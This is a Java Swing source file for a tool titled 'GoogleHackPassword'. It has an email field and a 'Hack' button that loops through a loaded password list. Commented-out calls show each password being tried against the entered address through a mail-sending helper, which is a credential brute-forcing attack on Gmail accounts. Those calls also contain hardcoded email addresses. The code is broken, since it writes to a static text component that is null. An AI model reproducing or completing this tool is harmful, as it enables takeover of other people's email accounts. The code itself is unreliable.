package m_mail_app;

import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.mail.MessagingException;
import javax.mail.internet.AddressException;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.border.EmptyBorder;
import javax.swing.text.JTextComponent;
import javax.swing.JTextField;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.JScrollPane;
import java.awt.TextArea;
import javax.swing.JDesktopPane;
import java.awt.Color;
import javax.swing.JLabel;

public class GoogleHackPassword extends JFrame {

	protected static final JTextComponent textArea = null;
	private JPanel contentPane;
	private JTextField textField;
	private JTextArea textAbout;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					GoogleHackPassword frame = new GoogleHackPassword();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public GoogleHackPassword() {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(null);
		
		textField = new JTextField();
		textField.setBounds(12, 50, 126, 19);
		contentPane.add(textField);
		textField.setColumns(10);
		
		textAbout = new JTextArea(11, 5);
		textAbout.setForeground(new Color(51, 51, 51));
		textAbout.setBackground(new Color(255, 255, 255));
		textAbout.setEditable(false);
		JScrollPane scrollPane = new JScrollPane(textAbout);
		scrollPane.setBounds(161, 11, 200, 197);
		contentPane.add(scrollPane);
		
		JButton btnNewButton = new JButton("Hack");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Utility utl = new Utility();
				SendGoogle google = new SendGoogle();
				
				utl.loadPasswords();
				for(int i = 0; i < utl.passwords.size(); i++){
					//google.recSend3(textField.getText(), "javatest56789@gmail.com", "Password", "Password: " +utl.passwords.get(i));
					//google.Send(textField.getText(), utl.passwords.get(i), "olivialesbian@yahoo.com", "Password", utl.passwords.get(i));
					google.recSend(-1);
					textArea.setText("Password: " + utl.passwords.get(i));
				}
			}
		});
		btnNewButton.setBounds(12, 110, 117, 25);
		contentPane.add(btnNewButton);
		
		JButton btnBack = new JButton("Back");
		btnBack.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				dispose();
				MainFrame frame = new MainFrame();
				frame.setVisible(true);
			}
		});
		btnBack.setBounds(288, 236, 117, 25);
		contentPane.add(btnBack);
		
		JLabel lblEmail = new JLabel("Email:");
		lblEmail.setBounds(12, 23, 70, 15);
		contentPane.add(lblEmail);
	}
}
